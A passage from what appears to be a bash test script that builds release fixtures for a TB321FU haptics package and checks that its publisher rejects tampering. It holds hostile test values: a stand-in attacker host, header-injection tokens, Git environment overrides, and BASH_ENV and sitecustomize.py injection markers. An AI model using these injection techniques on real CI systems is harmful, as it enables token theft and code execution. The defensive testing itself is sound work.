  "$publisher_repo/haptics/daily-current/linux/drivers/input/misc/aw86937-y700.c" \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/daily-current/linux/drivers/input/misc/aw86937-y700.c"
cp -- \
  "$publisher_repo/haptics/rootfs-reference/usr/lib/firmware/haptic_ram.bin" \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_ram.bin"
cp -- \
  "$publisher_repo/haptics/rootfs-reference/usr/lib/firmware/haptic_click.bin" \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_click.bin"
cp -- \
  "$publisher_repo/haptics/baseline-20260614-daily-clean/testing-tools/y700-haptic-test.c" \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/baseline-20260614-daily-clean/testing-tools/y700-haptic-test.c"
cp -- \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/daily-current/linux/drivers/input/misc/aw86937-y700.c" \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/build/aw86937-haptics.c"
sed -i \
  -e 's/Lenovo Y700 AW86937 input force-feedback haptics driver/Lenovo TB321FU AW86937 input force-feedback haptics driver/g' \
  -e 's/\.name = "aw86937-y700"/.name = "aw86937-haptics"/g' \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/build/aw86937-haptics.c"
sed -i '/{ "aw86937_y700" }/i\	{ "aw86937_haptics" },' \
  "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/build/aw86937-haptics.c"

fixture_tools=(
  bash dash env readlink realpath basename dirname date sleep timeout mktemp mkdir rm chmod cp
  mv ln cat find install touch stat awk grep sed sort cut cmp tee tr wc git curl python3
  make flex bison m4 gcc as ld ar rsync dpkg dpkg-deb sha256sum
  aarch64-linux-gnu-gcc aarch64-linux-gnu-cpp aarch64-linux-gnu-as
  aarch64-linux-gnu-ld aarch64-linux-gnu-ar aarch64-linux-gnu-nm
  aarch64-linux-gnu-objcopy aarch64-linux-gnu-objdump aarch64-linux-gnu-readelf
  aarch64-linux-gnu-strip modinfo tar gzip xz sh bc getconf sha1sum uname head expr uniq xargs
)
fixture_tool_records=$scratch/fixture-tool-records.tsv
: > "$fixture_tool_records"
for fixture_tool in "${fixture_tools[@]}"; do
  printf 'tool\t%s\t/usr/bin/%s\t/usr/bin/%s\t%s\tfixture %s 1.0\n' \
    "$fixture_tool" "$fixture_tool" "$fixture_tool" \
    dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd \
    "$fixture_tool" >> "$fixture_tool_records"
done
fixture_build_toolset=$(sha256sum "$fixture_tool_records" | awk '{ print $1 }')
{
  printf 'schema\ttb321fu.haptics-build-tools/v2\n'
  printf 'environment-policy\tisolated-allowlist-v1\n'
  printf 'environment-policy-sha256\t75081abd54528aaa186c18cf8169c19bfc4e80cc1a67cc7859c585dfe8f9c850\n'
  printf 'build-toolset-sha256\t%s\n' "$fixture_build_toolset"
  cat "$fixture_tool_records"
} > "$fixture_producer/HAPTICS-BUILD-TOOLS.tsv"
fixture_build_tools=$(sha256sum "$fixture_producer/HAPTICS-BUILD-TOOLS.tsv" | awk '{ print $1 }')
fixture_driver=$(sha256sum "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/daily-current/linux/drivers/input/misc/aw86937-y700.c" | awk '{ print $1 }')
fixture_build_source=$(sha256sum "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/build/aw86937-haptics.c" | awk '{ print $1 }')
fixture_ram=$(sha256sum "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_ram.bin" | awk '{ print $1 }')
fixture_click=$(sha256sum "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_click.bin" | awk '{ print $1 }')
fixture_helper_source=$(sha256sum "$fixture_producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/baseline-20260614-daily-clean/testing-tools/y700-haptic-test.c" | awk '{ print $1 }')
cat > "$publisher_scripts/HAPTICS-RELEASE-REFERENCE.tsv" <<EOF
schema	tb321fu.haptics-release-reference/v3
reference-producer-commit	$reference_producer
reference-archive-sha256	eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
package-version	20260730.2
kernel-bundle-id	$fixture_bundle
kernel-toolchain-manifest-sha256	$fixture_toolchain
kernel-build-archive-url	https://example.invalid/kernel-sdk.tar.gz
kernel-bundle-metadata-url	https://example.invalid/KERNEL-BUNDLE.tsv
kernel-bundle-metadata-sha256	ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
kernel-sdk-manifest-url	https://example.invalid/KERNEL-SDK-MANIFEST.tsv
kernel-toolchain-manifest-url	https://example.invalid/KERNEL-TOOLCHAIN.tsv
build-toolset-sha256	$fixture_build_toolset
build-tools-manifest-sha256	$fixture_build_tools
aw86937-driver-sha256	$fixture_driver
aw86937-build-source-sha256	$fixture_build_source
haptic-ram-firmware-sha256	$fixture_ram
haptic-click-firmware-sha256	$fixture_click
haptic-test-helper-sha256	$fixture_helper_source
kernel-release	7.1.1-00009-g570b90203d97
kernel-source-commit	570b90203d97f67321fa0fb2d0af73c31d7111af
kernel-config-sha256	9999999999999999999999999999999999999999999999999999999999999999
kernel-build-archive-sha256	8888888888888888888888888888888888888888888888888888888888888888
haptics-deb-sha256	$fixture_deb_sha
haptics-module-sha256	$fixture_module
haptics-helper-sha256	$fixture_helper
EOF
chmod 0755 \
  "$publisher_scripts/publish-release.sh" \
  "$publisher_scripts/publish-draft-release-by-id.sh" \
  "$publisher_scripts/verify-haptics-release-archive.sh" \
  "$publisher_scripts/verify-haptics-publication-stage.sh" \
  "$publisher_scripts/snapshot-bounded-regular-file.py" \
  "$publisher_scripts/snapshot-haptics-publication-stage.py" \
  "$publisher_scripts/verify-haptics-release-provenance.py" \
  "$publisher_scripts/verify-haptics-release-reference.py"
git -C "$publisher_repo" add scripts haptics
git -C "$publisher_repo" commit -q -m publisher
test_producer_sha=$(git -C "$publisher_repo" rev-parse HEAD)
PUBLISH=$publisher_scripts/publish-release.sh
PUBLISH_DRAFT_BY_ID=$publisher_scripts/publish-draft-release-by-id.sh

fixture_epoch=$(git -C "$publisher_repo" show -s --format=%ct "$test_producer_sha")
cat > "$fixture_producer/HAPTICS-SOURCE-LOCK.tsv" <<EOF
schema	tb321fu.haptics-source-lock/v4
haptics-output-mode	release-candidate
haptics-producer-commit	$test_producer_sha
haptics-producer-state	clean
environment-policy	isolated-allowlist-v1
environment-policy-sha256	75081abd54528aaa186c18cf8169c19bfc4e80cc1a67cc7859c585dfe8f9c850
build-toolset-sha256	$fixture_build_toolset
build-tools-manifest	HAPTICS-BUILD-TOOLS.tsv
build-tools-manifest-sha256	$fixture_build_tools
aw86937-driver-sha256	$fixture_driver
aw86937-build-source-sha256	$fixture_build_source
haptic-ram-firmware-sha256	$fixture_ram
haptic-click-firmware-sha256	$fixture_click
haptic-test-helper-sha256	$fixture_helper_source
aw86937-module-sha256	$fixture_module
haptic-test-helper-binary-sha256	$fixture_helper
kernel-bundle-id	$fixture_bundle
kernel-toolchain-manifest-sha256	$fixture_toolchain
kernel-release	7.1.1-00009-g570b90203d97
kernel-source-commit	570b90203d97f67321fa0fb2d0af73c31d7111af
kernel-config-sha256	9999999999999999999999999999999999999999999999999999999999999999
kernel-build-input	kernel-sdk-archive
kernel-build-archive-sha256	8888888888888888888888888888888888888888888888888888888888888888
source-date-epoch	$fixture_epoch
EOF
git -C "$publisher_repo" branch -f tb321fu-haptics-producer "$test_producer_sha"
git -C "$publisher_repo" bundle create \
  "$fixture_producer/HAPTICS-PRODUCER.bundle" \
  refs/heads/tb321fu-haptics-producer
fixture_members=(
  "$fixture_deb"
  HAPTICS-SOURCE-LOCK.tsv
  HAPTICS-BUILD-TOOLS.tsv
  HAPTICS-PRODUCER.bundle
  HAPTICS-SOURCE-SNAPSHOT/source/haptics/daily-current/linux/drivers/input/misc/aw86937-y700.c
  HAPTICS-SOURCE-SNAPSHOT/build/aw86937-haptics.c
  HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_ram.bin
  HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_click.bin
  HAPTICS-SOURCE-SNAPSHOT/source/haptics/baseline-20260614-daily-clean/testing-tools/y700-haptic-test.c
  SHA256SUMS-tb321fu-haptics-debs.txt
)
(
  cd "$fixture_producer"
  for fixture_member in "${fixture_members[@]:0:9}"; do
    sha256sum "./$fixture_member"
  done > SHA256SUMS-tb321fu-haptics-debs.txt
)
find "$fixture_producer" -type f -exec chmod 0644 {} +

policy_candidate="$scratch/policy-candidate"
policy_reference="$scratch/policy-reference.tsv"
cp -a -- "$fixture_producer/." "$policy_candidate/"
cp -- "$publisher_scripts/HAPTICS-RELEASE-REFERENCE.tsv" "$policy_reference"
candidate_policy_sha=1111111111111111111111111111111111111111111111111111111111111111
sed -i \
  "s/^environment-policy-sha256\t.*/environment-policy-sha256\t$candidate_policy_sha/" \
  "$policy_candidate/HAPTICS-BUILD-TOOLS.tsv" \
  "$policy_candidate/HAPTICS-SOURCE-LOCK.tsv"
candidate_build_tools=$(sha256sum \
  "$policy_candidate/HAPTICS-BUILD-TOOLS.tsv" | awk '{ print $1 }')
sed -i \
  "s/^build-tools-manifest-sha256\t.*/build-tools-manifest-sha256\t$candidate_build_tools/" \
  "$policy_candidate/HAPTICS-SOURCE-LOCK.tsv" \
  "$policy_reference"
(
  cd "$policy_candidate"
  for fixture_member in "${fixture_members[@]:0:9}"; do
    sha256sum "./$fixture_member"
  done > SHA256SUMS-tb321fu-haptics-debs.txt
)
find "$policy_candidate" -type f -exec chmod 0644 {} +
chmod 0644 "$policy_reference"
/usr/bin/python3 -I -B "$publisher_scripts/verify-haptics-release-provenance.py" \
  "$policy_candidate" 20260730.2 "$test_producer_sha" "$policy_reference"
crossed_reference="$scratch/policy-reference-crossed.tsv"
cp -- "$policy_reference" "$crossed_reference"
sed -i \
  's/^build-tools-manifest-sha256\t.*/build-tools-manifest-sha256\t0000000000000000000000000000000000000000000000000000000000000000/' \
  "$crossed_reference"
if /usr/bin/python3 -I -B "$publisher_scripts/verify-haptics-release-provenance.py" \
    "$policy_candidate" 20260730.2 "$test_producer_sha" \
    "$crossed_reference" >/dev/null 2>&1; then
  printf 'crossed release-reference/build-tools policy was accepted\n' >&2
  exit 1
fi
crossed_lock="$scratch/policy-lock-crossed"
cp -a -- "$policy_candidate/." "$crossed_lock/"
sed -i \
  's/^environment-policy-sha256\t.*/environment-policy-sha256\t2222222222222222222222222222222222222222222222222222222222222222/' \
  "$crossed_lock/HAPTICS-SOURCE-LOCK.tsv"
(
  cd "$crossed_lock"
  for fixture_member in "${fixture_members[@]:0:9}"; do
    sha256sum "./$fixture_member"
  done > SHA256SUMS-tb321fu-haptics-debs.txt
)
find "$crossed_lock" -type f -exec chmod 0644 {} +
if /usr/bin/python3 -I -B "$publisher_scripts/verify-haptics-release-provenance.py" \
    "$crossed_lock" 20260730.2 "$test_producer_sha" \
    "$policy_reference" >/dev/null 2>&1; then
  printf 'crossed source-lock/build-tools policy was accepted\n' >&2
  exit 1
fi

mkdir -p "$scratch/release"
(
  cd "$fixture_producer"
  tar --format=gnu --mtime="@$fixture_epoch" --owner=0 --group=0 --numeric-owner -czf \
    "$scratch/release/tb321fu-haptics-debs_20260730.2_arm64.tar.gz" -- \
    "${fixture_members[@]}"
)
chmod 0644 "$scratch/release/tb321fu-haptics-debs_20260730.2_arm64.tar.gz"
cp -- \
  "$fixture_producer/HAPTICS-SOURCE-LOCK.tsv" \
  "$fixture_producer/SHA256SUMS-tb321fu-haptics-debs.txt" \
  "$scratch/release/"
fixture_archive_sha=$(sha256sum \
  "$scratch/release/tb321fu-haptics-debs_20260730.2_arm64.tar.gz" | awk '{ print $1 }')
fixture_source_lock_sha=$(sha256sum \
  "$scratch/release/HAPTICS-SOURCE-LOCK.tsv" | awk '{ print $1 }')
cat > "$scratch/release/BUILD-PARAMETERS.md" <<EOF
# TB321FU Haptics Debs

- Package version: 20260730.2
- Kernel source commit: 570b90203d97f67321fa0fb2d0af73c31d7111af
- Kernel SDK: https://example.invalid/kernel-sdk.tar.gz
- Kernel SDK SHA-256: 8888888888888888888888888888888888888888888888888888888888888888
- Kernel bundle metadata: https://example.invalid/KERNEL-BUNDLE.tsv
- Kernel bundle metadata SHA-256: ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
- Kernel bundle ID: $fixture_bundle
- Kernel SDK manifest: https://example.invalid/KERNEL-SDK-MANIFEST.tsv
- Kernel toolchain manifest: https://example.invalid/KERNEL-TOOLCHAIN.tsv
- Kernel toolchain manifest SHA-256: $fixture_toolchain
- Commit: $test_producer_sha
- Workflow run: 123456
- Haptics archive SHA-256: $fixture_archive_sha
- Haptics DEB SHA-256: $fixture_deb_sha
- Haptics source lock SHA-256: $fixture_source_lock_sha
- Trusted reference producer: $reference_producer
- Trusted reference archive SHA-256: eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
- Trusted reference DEB SHA-256: $fixture_deb_sha
- Candidate HAPTICS_MODULE_SHA256: $fixture_module
- Candidate HAPTICS_HELPER_BINARY_SHA256: $fixture_helper

Static CI verifies package/lifecycle behavior; stop/suspend/resume remains a device gate.
Compiled digests require a byte-identical second trusted build and independent consumer pinning.
EOF
chmod 0644 "$scratch/release/BUILD-PARAMETERS.md"
(cd "$scratch/release" && sha256sum \
  tb321fu-haptics-debs_20260730.2_arm64.tar.gz \
  HAPTICS-SOURCE-LOCK.tsv \
  SHA256SUMS-tb321fu-haptics-debs.txt \
  BUILD-PARAMETERS.md > SHA256SUMS.txt)
chmod 0644 "$scratch/release/SHA256SUMS.txt"
cp -- "$scratch/release/tb321fu-haptics-debs_20260730.2_arm64.tar.gz" \
  "$scratch/canonical-release.tar.gz"
cp -- "$scratch/release/SHA256SUMS.txt" "$scratch/canonical-release-SHA256SUMS.txt"

run_publish() {
  local state=$1
  local release=${PUBLISH_RELEASE_DIR:-"$scratch/release"}
  local notes=${PUBLISH_NOTES_FILE:-"$release/BUILD-PARAMETERS.md"}
  shift
  PATH="$fakebin:$PATH" GH_STATE="$state" \
    AUTH_SENTINEL_FILE="$token_sentinel_file" \
    GH_TOKEN="$release_token" GITHUB_TOKEN="$fallback_token" \
    GH_ENTERPRISE_TOKEN="$fallback_token" GITHUB_ENTERPRISE_TOKEN="$fallback_token" \
    GH_HOST=attacker.invalid GH_DEBUG=api \
    EXPECTED_PRODUCER_SHA="$test_producer_sha" \
    GITHUB_REPOSITORY=GUF296/tb321fu-haptics-debs \
    GITHUB_SHA="$test_producer_sha" \
    "$@" /bin/bash -p "$PUBLISH" \
      tb321fu-haptics-debs-20260730.2 "$release" "$notes"
}

run_publish_draft_by_id() {
  local state=$1
  local release_id=${PUBLISH_RELEASE_ID:-101}
  local release_tag=${PUBLISH_RELEASE_TAG:-tb321fu-haptics-debs-20260730.2}
  local release=${PUBLISH_RELEASE_DIR:-"$scratch/release"}
  local notes=${PUBLISH_NOTES_FILE:-"$release/BUILD-PARAMETERS.md"}
  shift
  PATH="$fakebin:$PATH" GH_STATE="$state" \
    AUTH_SENTINEL_FILE="$token_sentinel_file" \
    GH_TOKEN="$release_token" GITHUB_TOKEN="$fallback_token" \
    GH_ENTERPRISE_TOKEN="$fallback_token" GITHUB_ENTERPRISE_TOKEN="$fallback_token" \
    GH_HOST=attacker.invalid GH_DEBUG=api \
    FAKE_NUMERIC_PUBLISHER=1 EXPECTED_PRODUCER_SHA="$test_producer_sha" \
    GITHUB_REPOSITORY=GUF296/tb321fu-haptics-debs \
    GITHUB_SHA="$test_producer_sha" \
    "$@" /bin/bash -p "$PUBLISH_DRAFT_BY_ID" "$release_id" "$release_tag" \
      "$release" "$notes"
}

capture_sequence=0
CAPTURE_OUTPUT=
CAPTURE_STATUS=0
capture_bounded() {
  local label=$1 output_file output_size
  shift
  capture_sequence=$((capture_sequence + 1))
  output_file=$scratch/capture-${capture_sequence}.log
  set +e
  (
    ulimit -f 1024
    "$@"
  ) > "$output_file" 2>&1
  CAPTURE_STATUS=$?
  set -e
  output_size=$(/usr/bin/stat -c %s -- "$output_file")
  if [ "$output_size" -gt 1048576 ]; then
    printf 'bounded capture %s exceeded 1048576 bytes\n' "$label" >&2
    exit 1
  fi
  CAPTURE_OUTPUT=$(< "$output_file")
  rm -f -- "$output_file"
}

create_verified_draft() {
  local state=$1

  run_publish "$state" env PRERELEASE=1 >/dev/null
  [ "$(cat "$state/draft")" = true ]
  [ "$(cat "$state/prerelease")" = true ]
}

rewrite_remote_assets_from_release() {
  local state=$1 asset name size digest

  : > "$state/assets.tsv"
  while IFS= read -r -d '' asset; do
    name=${asset##*/}
    size=$(stat -c '%s' "$asset")
    digest=sha256:$(sha256sum "$asset" | awk '{ print $1 }')
    printf '%s\t%s\t%s\n' "$name" "$size" "$digest" >> "$state/assets.tsv"
  done < <(find "$scratch/release" -mindepth 1 -maxdepth 1 -type f -print0 | sort -z)
}

assert_curl_auth_hygiene() {
  local state=$1

  [ -s "$state/curl-process-inspection.log" ]
  [ -s "$state/curl-stdin-auth.log" ]
  if grep -Fq -- "$release_token" "$state/curl-calls.log"; then
    printf 'release token was recorded in curl arguments\n' >&2
    exit 1
  fi
}

replace_tsv_value() {
  local file=$1 key=$2 value=$3

  awk -F '\t' -v OFS='\t' -v key="$key" -v value="$value" '
    $1 == key { $2 = value; found++ }
    { print }
    END { if (found != 1) exit 1 }
  ' "$file" > "$file.new"
  mv -- "$file.new" "$file"
}

refresh_fixture_provenance() {
  local producer=$1 records toolset manifest
  local driver build_source ram click helper_source member

  records=$producer/HAPTICS-BUILD-TOOLS.records.tsv
  tail -n +5 "$producer/HAPTICS-BUILD-TOOLS.tsv" > "$records"
  toolset=$(sha256sum "$records" | awk '{ print $1 }')
  replace_tsv_value "$producer/HAPTICS-BUILD-TOOLS.tsv" \
    build-toolset-sha256 "$toolset"
  rm -f -- "$records"
  manifest=$(sha256sum "$producer/HAPTICS-BUILD-TOOLS.tsv" | awk '{ print $1 }')
  driver=$(sha256sum "$producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/daily-current/linux/drivers/input/misc/aw86937-y700.c" | awk '{ print $1 }')
  build_source=$(sha256sum "$producer/HAPTICS-SOURCE-SNAPSHOT/build/aw86937-haptics.c" | awk '{ print $1 }')
  ram=$(sha256sum "$producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_ram.bin" | awk '{ print $1 }')
  click=$(sha256sum "$producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/rootfs-reference/usr/lib/firmware/haptic_click.bin" | awk '{ print $1 }')
  helper_source=$(sha256sum "$producer/HAPTICS-SOURCE-SNAPSHOT/source/haptics/baseline-20260614-daily-clean/testing-tools/y700-haptic-test.c" | awk '{ print $1 }')
  replace_tsv_value "$producer/HAPTICS-SOURCE-LOCK.tsv" build-toolset-sha256 "$toolset"
  replace_tsv_value "$producer/HAPTICS-SOURCE-LOCK.tsv" build-tools-manifest-sha256 "$manifest"
  replace_tsv_value "$producer/HAPTICS-SOURCE-LOCK.tsv" aw86937-driver-sha256 "$driver"
  replace_tsv_value "$producer/HAPTICS-SOURCE-LOCK.tsv" aw86937-build-source-sha256 "$build_source"
  replace_tsv_value "$producer/HAPTICS-SOURCE-LOCK.tsv" haptic-ram-firmware-sha256 "$ram"
  replace_tsv_value "$producer/HAPTICS-SOURCE-LOCK.tsv" haptic-click-firmware-sha256 "$click"
  replace_tsv_value "$producer/HAPTICS-SOURCE-LOCK.tsv" haptic-test-helper-sha256 "$helper_source"
  (
    cd "$producer"
    for member in "${fixture_members[@]:0:9}"; do
      sha256sum "./$member"
    done > SHA256SUMS-tb321fu-haptics-debs.txt
  )
  find "$producer" -type f -exec chmod 0644 {} +
}

build_fixture_release() {
  local producer=$1 release=$2 archive archive_sha lock_sha

  mkdir -p -- "$release"
  archive="$release/tb321fu-haptics-debs_20260730.2_arm64.tar.gz"
  (
    cd "$producer"
    tar --format=gnu --mtime="@$fixture_epoch" --owner=0 --group=0 --numeric-owner \
      -czf "$archive" -- \
      "${fixture_members[@]}"
  )
  chmod 0644 "$archive"
  cp -- "$producer/HAPTICS-SOURCE-LOCK.tsv" \
    "$producer/SHA256SUMS-tb321fu-haptics-debs.txt" "$release/"
  cp -- "$scratch/release/BUILD-PARAMETERS.md" "$release/BUILD-PARAMETERS.md"
  archive_sha=$(sha256sum "$archive" | awk '{ print $1 }')
  lock_sha=$(sha256sum "$release/HAPTICS-SOURCE-LOCK.tsv" | awk '{ print $1 }')
  sed -i \
    -e "s/^- Haptics archive SHA-256: .*/- Haptics archive SHA-256: $archive_sha/" \
    -e "s/^- Haptics source lock SHA-256: .*/- Haptics source lock SHA-256: $lock_sha/" \
    "$release/BUILD-PARAMETERS.md"
  (
    cd "$release"
    sha256sum tb321fu-haptics-debs_20260730.2_arm64.tar.gz \
      HAPTICS-SOURCE-LOCK.tsv SHA256SUMS-tb321fu-haptics-debs.txt \
      BUILD-PARAMETERS.md > SHA256SUMS.txt
  )
  chmod 0644 "$release"/*
}

make_extra_object_bundle() {
  local destination=$1 extra_object

  extra_object=$(printf 'unreachable publication fixture\n' | \
    git -C "$publisher_repo" hash-object -w --stdin)
  {
    printf '# v2 git bundle\n'
    printf '%s refs/heads/tb321fu-haptics-producer\n\n' "$test_producer_sha"
    printf '%s\n%s\n' "$test_producer_sha" "$extra_object" | \
      git -C "$publisher_repo" pack-objects --stdout --revs
  } > "$destination"
  chmod 0644 "$destination"
}

state_token_newline=$scratch/state-token-newline
capture_bounded token-newline run_publish "$state_token_newline" \
  env PRERELEASE=1 GH_TOKEN=$'test-release-token\nInjected: value'
token_error=$CAPTURE_OUTPUT
token_status=$CAPTURE_STATUS
if [ "$token_status" -eq 0 ]; then
  printf 'publisher accepted a release token containing a line break\n' >&2
  exit 1
fi
grep -Fxq 'GH_TOKEN contains a forbidden line break' <<< "$token_error" || {
  printf 'newline token failed outside the publisher framing boundary: %s\n' "$token_error" >&2
  exit 1
}
[ ! -e "$state_token_newline" ]

state_token_carriage_return=$scratch/state-token-carriage-return
capture_bounded token-carriage-return run_publish \
  "$state_token_carriage_return" env PRERELEASE=1 \
  GH_TOKEN=$'test-release-token\rInjected: value'
token_error=$CAPTURE_OUTPUT
token_status=$CAPTURE_STATUS
if [ "$token_status" -eq 0 ]; then
  printf 'publisher accepted a release token containing a carriage return\n' >&2
  exit 1
fi
grep -Fxq 'GH_TOKEN contains a forbidden line break' <<< "$token_error" || {
  printf 'carriage-return token failed outside the publisher framing boundary: %s\n' "$token_error" >&2
  exit 1
}
[ ! -e "$state_token_carriage_return" ]

printf -v overlong_token '%4097s' ''
overlong_token=${overlong_token// /x}
state_token_overlong=$scratch/state-token-overlong
capture_bounded token-overlong run_publish "$state_token_overlong" \
  env PRERELEASE=1 GH_TOKEN="$overlong_token"
token_error=$CAPTURE_OUTPUT
token_status=$CAPTURE_STATUS
if [ "$token_status" -eq 0 ]; then
  printf 'publisher accepted an overlong release token\n' >&2
  exit 1
fi
grep -Fxq 'GH_TOKEN exceeds the supported length' <<< "$token_error" || {
  printf 'overlong token failed outside the publisher framing boundary: %s\n' "$token_error" >&2
  exit 1
}
[ ! -e "$state_token_overlong" ]
printf 'PASS unsafe release token framing is rejected before remote access\n'

printf '# Different Notes\n' > "$scratch/untracked-notes.md"
state_notes_mismatch=$scratch/state-notes-mismatch
if PUBLISH_NOTES_FILE="$scratch/untracked-notes.md" \
    run_publish "$state_notes_mismatch" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'publisher accepted notes that are not the checksummed release asset\n' >&2
  exit 1
fi
[ ! -e "$state_notes_mismatch" ]
printf 'PASS publisher requires notes to match the checksummed release asset\n'

state_missing=$scratch/state-missing
if run_publish "$state_missing" env >/dev/null 2>&1; then
  printf 'publication without explicit prerelease mode was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_missing/calls.log" ]

state_false=$scratch/state-false
if run_publish "$state_false" env PRERELEASE=0 >/dev/null 2>&1; then
  printf 'normal/latest release mode was accepted\n' >&2
  exit 1
fi
[ ! -f "$state_false/calls.log" ]
printf 'PASS publication requires explicit prerelease-only mode\n'

state_draft_extra_local=$scratch/state-draft-extra-local
printf 'unexpected\n' > "$scratch/release/unexpected.bin"
(
  cd "$scratch/release"
  sha256sum \
    BUILD-PARAMETERS.md \
    HAPTICS-SOURCE-LOCK.tsv \
    SHA256SUMS-tb321fu-haptics-debs.txt \
    tb321fu-haptics-debs_20260730.2_arm64.tar.gz \
    unexpected.bin > SHA256SUMS.txt
)
if run_publish "$state_draft_extra_local" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'draft creator accepted a checksum-closed non-canonical asset set\n' >&2
  exit 1
fi
[ ! -f "$state_draft_extra_local/calls.log" ]
rm -f -- "$scratch/release/unexpected.bin"
cp -- "$scratch/canonical-release-SHA256SUMS.txt" "$scratch/release/SHA256SUMS.txt"
printf 'PASS draft creation requires the exact five-asset contract\n'

state_draft_wrong_repo=$scratch/state-draft-wrong-repo
if run_publish "$state_draft_wrong_repo" env PRERELEASE=1 \
    GITHUB_REPOSITORY=attacker/example >/dev/null 2>&1; then
  printf 'draft creator accepted the wrong repository\n' >&2
  exit 1
fi
[ ! -f "$state_draft_wrong_repo/calls.log" ]

state_draft_wrong_head=$scratch/state-draft-wrong-head
if run_publish "$state_draft_wrong_head" env PRERELEASE=1 \
    GITHUB_SHA=1111111111111111111111111111111111111111 >/dev/null 2>&1; then
  printf 'draft creator accepted the wrong local HEAD\n' >&2
  exit 1
fi
[ ! -f "$state_draft_wrong_head/calls.log" ]

printf 'dirty tracked checkout\n' >> "$publisher_repo/BASE"
state_draft_dirty_checkout=$scratch/state-draft-dirty-checkout
if run_publish "$state_draft_dirty_checkout" env PRERELEASE=1 >/dev/null 2>&1; then
  printf 'draft creator accepted a dirty producer checkout\n' >&2
  exit 1
fi
[ ! -f "$state_draft_dirty_checkout/calls.log" ]
printf 'reference base\n' > "$publisher_repo/BASE"
git -C "$publisher_repo" diff --quiet -- BASE

for unsafe_index_flag in assume-unchanged skip-worktree; do
  reference_path=scripts/ci/HAPTICS-RELEASE-REFERENCE.tsv
  case $unsafe_index_flag in
    assume-unchanged) git -C "$publisher_repo" update-index --assume-unchanged "$reference_path" ;;
    skip-worktree) git -C "$publisher_repo" update-index --skip-worktree "$reference_path" ;;
  esac
  printf 'hidden reference mutation\n' >> "$publisher_repo/$reference_path"
  state_index_flag=$scratch/state-index-${unsafe_index_flag}
  if run_publish "$state_index_flag" env PRERELEASE=1 >/dev/null 2>&1; then
    printf 'draft creator accepted hidden %s reference mutation\n' \
      "$unsafe_index_flag" >&2
    exit 1
  fi
  [ ! -f "$state_index_flag/calls.log" ]
  case $unsafe_index_flag in
    assume-unchanged) git -C "$publisher_repo" update-index --no-assume-unchanged "$reference_path" ;;
    skip-worktree) git -C "$publisher_repo" update-index --no-skip-worktree "$reference_path" ;;
  esac
  git -C "$publisher_repo" show "HEAD:$reference_path" > \
    "$publisher_repo/$reference_path.restored"
  mv -- "$publisher_repo/$reference_path.restored" "$publisher_repo/$reference_path"
done
git -C "$publisher_repo" diff --quiet -- scripts/ci/HAPTICS-RELEASE-REFERENCE.tsv

hostile_git_dir=$scratch/hostile-git-dir
hostile_index=$scratch/hostile-index
mkdir -p "$hostile_git_dir"
printf 'hostile index\n' > "$hostile_index"
state_hostile_git_env=$scratch/state-hostile-git-env
run_publish "$state_hostile_git_env" env PRERELEASE=1 \
  GIT_DIR="$hostile_git_dir" GIT_WORK_TREE="$scratch" \
  GIT_INDEX_FILE="$hostile_index" GIT_OBJECT_DIRECTORY="$hostile_git_dir" \
  GIT_ALTERNATE_OBJECT_DIRECTORIES="$hostile_git_dir" \
  GIT_REPLACE_REF_BASE=refs/replace/attacker GIT_CONFIG_COUNT=1 \
  GIT_CONFIG_KEY_0=core.fsmonitor GIT_CONFIG_VALUE_0=true \
  CI_GIT_BIN=/usr/bin/false CI_ENV_BIN=/usr/bin/false \
  CI_CURL_BIN=/usr/bin/false CI_PYTHON3_BIN=/usr/bin/false \
  CI_SHA256SUM_BIN=/usr/bin/false >/dev/null
[ "$(cat "$state_hostile_git_env/draft")" = true ]
printf 'PASS draft creation binds exact clean HEAD and sanitizes index/Git/CI overrides\n'

hostile_environment=$scratch/hostile-environment
mkdir -p -- "$hostile_environment"
bash_env_marker=$scratch/publisher-bash-env-executed
pythonpath_marker=$scratch/publisher-pythonpath-executed
function_marker=$scratch/publisher-function-executed
cat > "$hostile_environment/bash-env.sh" <<'SH'
[ -z "${HAPTICS_BASH_ENV_MARKER:-}" ] || : > "$HAPTICS_BASH_ENV_MARKER"
SH
cat > "$hostile_environment/sitecustomize.py" <<'PY'
import os
import pathlib

marker = os.environ.get("HAPTICS_PYTHON_MARKER")
if marker:
    pathlib.Path(marker).touch()
PY
HAPTICS_BASH_ENV_MARKER="$bash_env_marker" \
  BASH_ENV="$hostile_environment/bash-env.sh" /bin/bash -c ':'
[ -e "$bash_env_marker" ] || {
  printf 'hostile publisher BASH_ENV control did not execute\n' >&2
  exit 1
}
rm -f -- "$bash_env_marker"
HAPTICS_PYTHON_MARKER="$pythonpath_marker" \
